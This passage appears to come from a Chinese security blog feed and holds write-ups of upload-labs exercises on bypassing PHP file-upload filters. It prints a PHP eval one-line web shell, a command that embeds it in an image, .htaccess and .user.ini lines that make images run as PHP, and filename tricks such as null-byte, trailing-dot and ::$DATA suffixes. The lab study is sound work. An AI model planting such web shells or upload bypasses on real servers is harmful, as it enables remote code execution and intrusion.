    <url>/2022/09/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="文件上传——内容逻辑数组绕过"><a href="#文件上传——内容逻辑数组绕过" class="headerlink" title="文件上传——内容逻辑数组绕过"></a>文件上传——内容逻辑数组绕过</h1><h4 id="1-Pass—14（图片码，判断文件类型）"><a href="#1-Pass—14（图片码，判断文件类型）" class="headerlink" title="1.Pass—14（图片码，判断文件类型）"></a>1.Pass—14（图片码，判断文件类型）</h4><p>&emsp;&emsp;有些上传网站是通过判断文件的前两个字节从而判断文件类型：</p><ul><li>Png：89 50 4E 47 0D 0A 1A 0A</li><li>Jpg：FF D8</li><li>Gif：47 49 46 38 39|37 61 </li><li>Bmp：42 4D</li></ul><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E7%99%BD%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/14.png" style="zoom:80%;" /></center><p>&emsp;&emsp;一般操作是使用HEX的软件，我比较习惯用ida在合适的位置写入相关的代码，之后再cmd命令中，将图片和php文件进行拼接，首先建立一个后门代码和准备一个白名单的图片文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;x&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/1.png" style="zoom:80%;" /></center><p>&emsp;&emsp;然后使用命令copy将两个文件合成</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">copy</span> <span class="hljs-number">1</span>.png /b + shell13.php /a webshell.jpg<br></code></pre></td></tr></table></figure><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/2.png" style="zoom:80%;" /></center><p>&emsp;&emsp;然后查看文件包含的漏洞代码</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/3.png" style="zoom:80%;" /></center><p>&emsp;&emsp;看到是有用于测试图片码是否能正常运行的代码，我们只需要打开file为我们上传的png文件，将脚本进行相关执行就能达到目的</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/4.png" style="zoom:80%;" /></center><p>&emsp;&emsp;值得一提的是，我在操作的过程中，合并两个文件后，在生成的jpg文件中虽然有php代码，但是少了&lt;，所以在运行时出现了下图的错误，也就是无法解析出完成的php语言代码出来，具体原因我没有查找出来，如果我直接加入&lt;又会导致图片崩溃，所以可以尝试16进制打开png文件直接手动加入php代码，也是可以的</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/5.png" style="zoom:80%;" /></center><p>&emsp;&emsp;</p><h4 id="2-Pass—15（图片码，函数检测文件类型）"><a href="#2-Pass—15（图片码，函数检测文件类型）" class="headerlink" title="2.Pass—15（图片码，函数检测文件类型）"></a>2.Pass—15（图片码，函数检测文件类型）</h4><p>&emsp;&emsp;有的通过getimagesize()函数检查是否为图片文件</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E7%99%BD%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/15.png" style="zoom:80%;" /></center><p>&emsp;&emsp;破解原理同pass-14，只是一个是代码解析一个是函数解析，只要了解函数的本质即可攻破,getimagesize()函数检查图片，如果上传的不是图片文件的话，后续的代码就无法执行，也就是上传无法成功，后续的上传思路也就无法进行</p><p>&emsp;&emsp;</p><h4 id="3-Pass—16（图片码，同时检查字节和后缀）"><a href="#3-Pass—16（图片码，同时检查字节和后缀）" class="headerlink" title="3.Pass—16（图片码，同时检查字节和后缀）"></a>3.Pass—16（图片码，同时检查字节和后缀）</h4><p>&emsp;&emsp;采用后缀和字节的方式同时检查是前面的几种结合情况，一般是通过通过exif_imagetype()函数，读取图像的第一个字节，并检查其后缀名。而返回值与getimage()函数返回的索引2相同</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E7%99%BD%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/16.png" style="zoom:80%;" /></center><p>&emsp;&emsp;</p><h4 id="4-Pass—17（图片码，二次渲染）"><a href="#4-Pass—17（图片码，二次渲染）" class="headerlink" title="4.Pass—17（图片码，二次渲染）"></a>4.Pass—17（图片码，二次渲染）</h4><p>&emsp;&emsp;综合判断了后缀名、content-type，以及利用 imagecreatefromgif/png/jpg 函数该函数调用了PHP GD库。二次渲染是由Gif文件或 URL 创建新图像，成功则返回图像资源，失败则返回错误提示，这样子我们地方图片码的数据就会丢失，上传失败</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/6.png" style="zoom:80%;" /></center><p>&emsp;&emsp;因此想要成功上传图片马，我们需要制作一个二次渲染后，把原图和他修改过的图片进行比较，看看哪个部分没有被修改。将php代码放到没有被更改的部分，使得恶意代码依旧存在的图片即可。</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/7.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/8.png" style="zoom:80%;" /></center><p>&emsp;&emsp;我在上传的时候，发现普通的png和jpg能上传，但是使用合成了php代码的jpg文件却被提示不是jpg格式，所以可能存在检测内容的详细内容</p><p>&emsp;</p><h4 id="5-Pass—18（条件竞争一）"><a href="#5-Pass—18（条件竞争一）" class="headerlink" title="5.Pass—18（条件竞争一）"></a>5.Pass—18（条件竞争一）</h4><p>&emsp;&emsp;这主要是对于条件竞争的研究</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/9.png" style="zoom:80%;" /></center><p>&emsp;&emsp;查看代码，他是先将图片上传，之后才进行判断后缀名、二次渲染。我们只需要在上传的瞬间访问上传的文件，那服务器就不能对文件进行删除和二次渲染。也就是我们打开一个文件后，如果删除文件系统就会提示我们，该文件正在运行中，无法删除一样的道理。</p><p>&emsp;&emsp;首先发送php文件</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/9.5.png" style="zoom:80%;" /></center><p>&emsp;&emsp;开始使用爆破功能模仿一直上传的状态</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/10.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/11.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/14.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/12.png" style="zoom:80%;" /></center><p>&emsp;&emsp;然后使用另一个浏览器一直访问上传的php地址，只要在上传的一瞬间，在他还没删除和修改之前访问出来就可，记得</p><p>&emsp;</p><h4 id="5-Pass—19（条件竞争二）"><a href="#5-Pass—19（条件竞争二）" class="headerlink" title="5.Pass—19（条件竞争二）"></a>5.Pass—19（条件竞争二）</h4><p>&emsp;&emsp;与第18关不同的是这关是先检查了后缀名，然后上传，再进行二次渲染。所以需要我上传图片码然后重复18关的爆破操作即可，也就是访问地址加文件包含漏洞</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/13.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="6-Pass—20（方法一：-00截断）"><a href="#6-Pass—20（方法一：-00截断）" class="headerlink" title="6.Pass—20（方法一：%00截断）"></a>6.Pass—20（方法一：%00截断）</h4><p>&emsp;&emsp;由于之前提到的方法，在move_uploaded_file()函数中的img_path是由、save_name控制的，所以我们那可以在save_name利用%00进行文件名的截断</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/15.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/16.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/17.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="6-Pass—20（方法二：-）"><a href="#6-Pass—20（方法二：-）" class="headerlink" title="6.Pass—20（方法二：/.）"></a>6.Pass—20（方法二：/.）</h4><p>&emsp;&emsp;move_uploaded_file()有这么一个特性，会忽略掉文件末尾的 /.，也就说，用这种方式命名文件名，能过如果黑名单的审查，但是上传后会忽略/.，直接变成php的文件存到文件夹中</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/18.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/19.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="7-Pass—21（数组绕过-目录命名：ctf比较常见的文件上传类型）"><a href="#7-Pass—21（数组绕过-目录命名：ctf比较常见的文件上传类型）" class="headerlink" title="7.Pass—21（数组绕过+目录命名：ctf比较常见的文件上传类型）"></a>7.Pass—21（数组绕过+目录命名：ctf比较常见的文件上传类型）</h4><p>&emsp;&emsp;这一关是利用数组绕过验证，通过我们自己定义的不同的内容的数组从而绕过验证条件达到上传成功的目的，这种情况一般生活中是比较少见的，只有在代码审计中才能发现，不然就是一点点试了</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/20.png" style="zoom:80%;" /></center><p>&emsp;&emsp;这段代码相对于把一个文件名分为了2个，以liaoyue.jpg为例子，分为了liaoyue和jpg，然后检查jpg的字符内容，通过比对决定能否通过，其中的end就是截取文件的后几位，进行检查</p><p>&emsp;&emsp;当我们输入两个数组时间，例如在上传的时候将save_name改为多个数组，也就是save_name[0]=’xxx.php/.’，save_name[2]=’jpg’，这样子file={‘xxx.php/.’,’’,’jpg’}，取后面的值也就直接取了jpg了，最后就能通过比对。</p><p>&emsp;&emsp;然后是代码中的**$file_name = reset($file) . ‘.’ . $file[count($file) - 1];**，这里count($file)为2，减去1为1，所以是$file[1]，有因为我们上面赋值为空，所以上传时直接就等于xxx.php/.，而不是xxx.php/.jpg</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/21.png" style="zoom:80%;" /></center>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>文件上传——白名单验证绕过案例</title>
    <link href="/2022/09/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E7%99%BD%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/"/>
    <url>/2022/09/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E7%99%BD%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="文件上传——白名单验证绕过案例"><a href="#文件上传——白名单验证绕过案例" class="headerlink" title="文件上传——白名单验证绕过案例"></a>文件上传——白名单验证绕过案例</h1><h4 id="1-Pass-12（get-00截断）"><a href="#1-Pass-12（get-00截断）" class="headerlink" title="1.Pass-12（get 00截断）"></a>1.Pass-12（get 00截断）</h4><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E7%99%BD%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/1.png" style="zoom:80%;" /></center><p>&emsp;&emsp;原因是move_uploaded_file（底层为C），遇到0x00会截断（16进制），%00（URL编码）</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E7%99%BD%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/2.png" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看出是get类型的传送，尝试使用%00来截断</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E7%99%BD%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/3.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E7%99%BD%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/4.png" style="zoom:80%;" /></center><p>&emsp;&emsp;在文件路径后加上shell.php%00进行截断处理</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E7%99%BD%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/5.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E7%99%BD%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/6.png" style="zoom:80%;" /></center><p>&emsp;&emsp;将filename传入的文件名改为白名单内容</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E7%99%BD%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/7.png" style="zoom:80%;" /></center><p>&emsp;&emsp;最后上传php文件成功，值得一提的是，改漏洞的前提条件是php版本需要小于5.3.4，并且其中的magic_quotes_gpc为off状态即可。</p><p>&emsp;&emsp;</p><h4 id="2-Pass-13（post-00截断）"><a href="#2-Pass-13（post-00截断）" class="headerlink" title="2.Pass-13（post 00截断）"></a>2.Pass-13（post 00截断）</h4><p>&emsp;&emsp;与Pass—12基本原理相同，只是这次是post的的截断</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E7%99%BD%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/8.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E7%99%BD%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/9.png" style="zoom:80%;" /></center><p>&emsp;&emsp;将相关内容进行修改，并且在hex的板块中将+符号的编码改为00</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E7%99%BD%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/10.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E7%99%BD%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/11.png" style="zoom:80%;" /></center><p>&emsp;&emsp;尤其注意magic_quotes_gpc为off状态，本人是试了好几次才成功，过程中也是遇到各种情况，在小迪安全中，则不是使用+而是用%00然后点击url编码显示位一个口字，但是对于使用的burp版本有要求，具体原因并没有给出，而且最终上传并没有成功。</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E7%99%BD%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/12.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E7%99%BD%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/13.png" style="zoom:80%;" /></center>小知识：get会自动解码为url编码，而post则不会自动解码]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>文件上传——黑名单验证绕过案例</title>
    <link href="/2022/09/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/"/>
    <url>/2022/09/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="文件上传——黑名单验证绕过案例"><a href="#文件上传——黑名单验证绕过案例" class="headerlink" title="文件上传——黑名单验证绕过案例"></a>文件上传——黑名单验证绕过案例</h1><h4 id="1-Pass-03（特殊后缀）"><a href="#1-Pass-03（特殊后缀）" class="headerlink" title="1.Pass-03（特殊后缀）"></a>1.Pass-03（特殊后缀）</h4><p>&emsp;&emsp;进入提交界面，并查看提交php文件的反应</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/1.jpg" style="zoom:100%;" /></center>&emsp;&emsp;可以看见在反馈中，禁止了相关后缀的文件上传，所以我们可以尝试采用特殊后缀进行上传。修改使用特殊后缀进行尝试：<center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/2.jpg" style="zoom:100%;" /></center><p>&emsp;&emsp;我们将提交的文件后缀改为了php4的形式，发现能够提交成功：</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/3.jpg" style="zoom:100%;" /></center>&emsp;<h4 id="2-Pass-04（-htaccess）"><a href="#2-Pass-04（-htaccess）" class="headerlink" title="2.Pass-04（.htaccess）"></a>2.Pass-04（.htaccess）</h4><p>&emsp;&emsp;首先明确htaccess文件，它是超文本访问（Hypertext Access）的缩写，一个基于Apache的Web服务器使用的配置文件，用于控制它所在的目录以及该目录下的所有子目录。负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>&emsp;&emsp;参考连接：<a href="https://blog.csdn.net/weixin_46329243/article/details/113091399">https://blog.csdn.net/weixin_46329243/article/details/113091399</a></p><p>&emsp;&emsp;查看提交结果界面：</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/4.jpg" style="zoom:100%;" /></center><p>&emsp;&emsp;查看源码（当然，正常情况下我们是不可能有源码的）：</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/5.jpg" style="zoom:100%;" /></center><p>&emsp;&emsp;可以发现，这个禁止后缀禁止得很彻底，尝试htaccess方法,首先创建.htaccess并将其上传：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">AddType application/x-httpd-php.jpg<br></code></pre></td></tr></table></figure><p>&emsp;&emsp;就是将jpg文件解释为php格式，最终能够上传成功（当然，这需要看Apache的相关配置的）</p><p>&emsp;</p><h4 id="3-Pass-05（-user-ini）"><a href="#3-Pass-05（-user-ini）" class="headerlink" title="3.Pass-05（.user.ini）"></a>3.Pass-05（.user.ini）</h4><p>&emsp;&emsp;当禁用了.htaccess，提示显示上传目录存在php文件，所以我们可以尝试利用.user.ini的文件配置，其类似于.htaccess但是应用范围更广，只要是以fastcgi运行的php都可以用它来动态的局部修改php.ini中的配置</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/6.jpg" style="zoom:100%;" /></center><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs user.ini">auto_prepend_file=liaoyue.gif<br></code></pre></td></tr></table></figure><p>&emsp;&emsp;该.user.ini文件里面的意思是：所有的php文件都自动包含1.gif文件。.user.ini相当于一个用户自定义的php.ini。然后再上传一个内容为php的脚本，命名为liaoyue.gif</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/7.jpg" style="zoom:100%;" /></center><p>&emsp;&emsp;复制图像地址后，将文件名改为readme.php，然后密码设置为一句话的密码，蚁剑连接成功，最终上传成功。</p><p>&emsp;</p><h4 id="4-Pass-06（大小写绕过）"><a href="#4-Pass-06（大小写绕过）" class="headerlink" title="4.Pass-06（大小写绕过）"></a>4.Pass-06（大小写绕过）</h4><p>&emsp;&emsp;使用大小写也是一种绕过的方法,去除对文件后缀名的转为小写设定，直接选择后缀名为<code>.PHP</code>等非黑名单中存在的格式上传:</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/8.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/9.jpg" style="zoom:55%;" /></center><p>&emsp;&emsp;（总感觉作用不大……）</p><p>&emsp;</p><h4 id="5-Pass-07（空格绕过）"><a href="#5-Pass-07（空格绕过）" class="headerlink" title="5.Pass-07（空格绕过）"></a>5.Pass-07（空格绕过）</h4><p>&emsp;&emsp;选择后缀为<code>.php</code>的一句话上传，抓包后在后面增加空格，也是能够成功绕过。（这里需要在抓包工具中进行修改，我是没办法直接改文件名，系统会自动去掉空格）</p><p>&emsp;</p><h4 id="6-Pass-08（点号绕过）"><a href="#6-Pass-08（点号绕过）" class="headerlink" title="6.Pass-08（点号绕过）"></a>6.Pass-08（点号绕过）</h4><p>&emsp;&emsp;选择后缀为<code>.php</code>的一句话上传，抓包后在后面增加点，达到成功绕过的目的。（这里需要在抓包工具中进行修改，我是没办法直接改文件名，系统会自动去掉点）</p><p>&emsp;</p><h4 id="7-Pass-09（特殊字符-DATA绕过）"><a href="#7-Pass-09（特殊字符-DATA绕过）" class="headerlink" title="7.Pass-09（特殊字符::$DATA绕过）"></a>7.Pass-09（特殊字符::$DATA绕过）</h4><p>&emsp;&emsp;选择后缀为<code>.php</code>的一句话上传，抓包后在后面增加<code>::$DATA</code>，达到上传文件成功的目的。（这里需要在抓包工具中进行修改，我是没办法直接改文件名，系统不允许有::的存在）</p><p>&emsp;</p><h4 id="8-Pass-10（针对去掉名称后面的-）"><a href="#8-Pass-10（针对去掉名称后面的-）" class="headerlink" title="8.Pass-10（针对去掉名称后面的.）"></a>8.Pass-10（针对去掉名称后面的.）</h4><p>&emsp;&emsp;查看源码：</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/10.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看见，在源码里，对上述的一些文件名黑名单绕过都赶尽杀绝，但是对于源码中其路径拼接的是<code>$file_name</code>而不是<code>$file_ext</code>，而<code>$file_name</code>是仅仅处理了文件名末尾的点。所以我们可以尝试在点后面在多加一个.</p><p>&emsp;&emsp;选择后缀为<code>.php</code>的一句话上传，抓包后构造文件后缀为<code>php. .</code>，达到成功绕过的目的。</p><p>&emsp;</p><h4 id="9-Pass-11（双写绕过）"><a href="#9-Pass-11（双写绕过）" class="headerlink" title="9.Pass-11（双写绕过）"></a>9.Pass-11（双写绕过）</h4><p>&emsp;&emsp;查看源码：</p><center><img 